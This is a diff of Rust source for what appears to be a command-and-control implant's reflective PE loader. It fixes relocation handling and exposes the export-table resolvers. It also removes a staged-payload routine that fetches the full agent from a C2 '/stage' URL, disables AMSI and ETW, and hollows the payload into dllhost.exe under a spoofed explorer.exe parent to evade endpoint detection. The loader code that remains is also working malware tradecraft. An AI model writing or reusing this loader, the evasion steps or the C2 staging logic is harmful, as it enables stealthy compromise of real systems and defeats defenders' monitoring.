@@ -112,18 +112,22 @@ fn parse_pe(pe: &[u8]) -> Option<PeInfo> {
 
 // ── Base relocation ───────────────────────────────────────────────────────────
 
-unsafe fn apply_relocations(new_base: *mut u8, pe: &[u8], reloc_rva: u32, reloc_size: u32, delta: i64) {
+unsafe fn apply_relocations(new_base: *mut u8, reloc_rva: u32, reloc_size: u32, size_of_image: u32, delta: i64) {
+    // Read the relocation table from the MAPPED IMAGE (new_base + reloc_rva), NOT from the raw
+    // PE file bytes. After section copies, new_base[virtual_address] holds section data, so
+    // new_base[reloc_rva] is correct. Using the raw file bytes would treat the RVA as a file
+    // offset, which differs from the VMA whenever file_alignment != section_alignment.
     let mut off = reloc_rva as usize;
     let end = off + reloc_size as usize;
-    while off + 8 <= end && off + 8 <= pe.len() {
-        let page_rva   = u32::from_le_bytes([pe[off], pe[off+1], pe[off+2], pe[off+3]]);
-        let block_size = u32::from_le_bytes([pe[off+4], pe[off+5], pe[off+6], pe[off+7]]) as usize;
+    while off + 8 <= end && off + 8 <= size_of_image as usize {
+        let page_rva   = (new_base.add(off)     as *const u32).read_unaligned();
+        let block_size = (new_base.add(off + 4) as *const u32).read_unaligned() as usize;
         if block_size < 8 { break; }
         let n_entries = (block_size - 8) / 2;
         for i in 0..n_entries {
             let eo = off + 8 + i * 2;
-            if eo + 2 > pe.len() { break; }
-            let entry = u16::from_le_bytes([pe[eo], pe[eo+1]]);
+            if eo + 2 > size_of_image as usize { break; }
+            let entry = (new_base.add(eo) as *const u16).read_unaligned();
             if entry >> 12 == 10 { // IMAGE_REL_BASED_DIR64
                 let target = new_base.add(page_rva as usize + (entry & 0x0FFF) as usize) as *mut i64;
                 *target = (*target).wrapping_add(delta);
@@ -186,7 +190,7 @@ unsafe fn find_module_peb(dll_name_ansi: *const u8) -> Option<usize> {
 /// Walk a PE export table to resolve a function by name.
 /// Avoids GetProcAddress from non-image memory.
 #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
-unsafe fn get_export_by_name(dll_base: usize, fn_name: *const u8) -> Option<*const u8> {
+pub unsafe fn get_export_by_name(dll_base: usize, fn_name: *const u8) -> Option<*const u8> {
     let base = dll_base as *const u8;
     if *(base as *const u16) != 0x5A4D { return None; }
     let lfanew   = *(base.add(0x3C) as *const u32) as usize;
@@ -229,7 +233,7 @@ unsafe fn get_export_by_name(dll_base: usize, fn_name: *const u8) -> Option<*con
 
 /// Walk a PE export table to resolve a function by ordinal.
 #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
-unsafe fn get_export_by_ordinal(dll_base: usize, ordinal: u16) -> Option<*const u8> {
+pub unsafe fn get_export_by_ordinal(dll_base: usize, ordinal: u16) -> Option<*const u8> {
     let base = dll_base as *const u8;
     if *(base as *const u16) != 0x5A4D { return None; }
     let lfanew    = *(base.add(0x3C) as *const u32) as usize;
@@ -426,7 +430,7 @@ pub unsafe fn reflect_pe(pe: &[u8]) -> Result<*const u8, &'static str> {
     // Base relocations
     let delta = new_base as i64 - info.image_base as i64;
     if delta != 0 && info.reloc_rva != 0 {
-        apply_relocations(new_base, pe, info.reloc_rva, info.reloc_size, delta);
+        apply_relocations(new_base, info.reloc_rva, info.reloc_size, info.size_of_image, delta);
     }
 
     // Import address table
@@ -461,98 +465,3 @@ pub unsafe fn reflect_pe(pe: &[u8]) -> Result<*const u8, &'static str> {
     Ok(new_base.add(info.entry_point_rva as usize))
 }
 
-// ── Staged payload ────────────────────────────────────────────────────────────
-
-/// Fetch the full agent PE from the C2 /stage endpoint, reflectively load it,
-/// and transfer execution. Never returns on success.
-///
-/// The stager binary is compiled with DM_FEATURES=staged-payload,udrl and
-/// is intentionally tiny (~8 KB). It carries only the C2 host/port and build UUID
-/// needed to locate and retrieve the full agent PE.
-#[cfg(all(target_os = "windows", feature = "staged-payload", feature = "udrl"))]
-pub fn do_staged_load() -> ! {
-    // Resolve syscall numbers before any indirect-syscall use in reflect_pe.
-    // Must come before startup_patches (which also uses syscalls indirectly via
-    // init_stack_spoof) and before the network fetch.
-    let _ = crate::syscall::init();
-
-    // Apply AMSI/ETW bypass and stack-spoof gadget resolution *before* fetching
-    // and reflecting the full agent PE.  This ensures BD's user-mode hooks on
-    // AmsiScanBuffer and EtwEventWrite are already defused when the second
-    // reflect_pe call (for the full agent) runs its IAT resolution.
-    crate::evasion::startup_patches();
-
-    let url = format!(
-        "https://{}:{}/stage/{}",
-        crate::C2_HOST,
-        crate::C2_PORT,
-        crate::BUILD_UUID,
-    );
-
-    // Fetch the full PE over TLS. Reuse the existing HTTPS channel logic.
-    let pe_bytes = match fetch_stage(&url) {
-        Some(b) => b,
-        None    => {
-            // Staged fetch failed — silent exit, no crash, no log.
-            std::process::exit(0);
-        }
-    };
-
-    // Primary path (process-hollow + ppid-spoof builds): hollow the fetched PE into a
-    // suspended dllhost.exe with explorer.exe as the spoofed parent, then exit the stager.
-    // The stager lives only for the seconds it takes to fetch the payload and hollow,
-    // breaking the chrome → stager chain before ATD's async scoring can trigger a kill.
-    // The agent then runs inside a Microsoft-signed process that appears as explorer's child.
-    #[cfg(all(feature = "process-hollow", feature = "ppid-spoof"))]
-    {
-        let target = "C:\\Windows\\System32\\dllhost.exe";
-        let explorer_pid = crate::inject::pid_by_name("explorer.exe");
-        let spoofed = explorer_pid.and_then(|ppid| {
-            crate::inject::spawn_suspended_spoofed(target, ppid)
-        });
-        if let Some((proc, thread)) = spoofed {
-            if crate::inject::hollow_into_process(proc, thread, &pe_bytes).is_ok() {
-                std::process::exit(0);
-            }
-        }
-        // Fallback: hollow without PPID spoof (breaks chrome chain but parent is stager, not explorer)
-        let _ = crate::inject::inject_hollow(target, &pe_bytes);
-        std::process::exit(0);
-    }
-
-    // Non-spoof build: reflect in-process (stager process becomes the agent).
-    #[allow(unreachable_code)]
-    let entry = unsafe {
-        match reflect_pe(&pe_bytes) {
-            Ok(ep) => ep,
-            Err(_) => std::process::exit(0),
-        }
-    };
-    let main_fn: unsafe extern "system" fn() = unsafe { core::mem::transmute(entry) };
-    unsafe { main_fn() };
-
-    std::process::exit(0);
-}
-
-#[cfg(all(target_os = "windows", feature = "staged-payload", feature = "udrl"))]
-fn fetch_stage(url: &str) -> Option<Vec<u8>> {
-    let mut builder = ureq::AgentBuilder::new()
-        .timeout(std::time::Duration::from_secs(60));
-
-    // Respect the same TLS-skip-verify flag as the HTTPS channel.
-    if crate::channel::https::TLS_SKIP_VERIFY {
-        builder = builder.tls_config(std::sync::Arc::new(
-            crate::channel::https::danger_tls_config(),
-        ));
-    }
-    let agent = builder.build();
-    let resp = agent.get(url).call().ok()?;
-    let mut buf = Vec::new();
-    use std::io::Read;
-    resp.into_reader().read_to_end(&mut buf).ok()?;
-    if buf.len() < 64 {
-        // Too small to be a valid PE
-        return None;
-    }
-    Some(buf)
-}
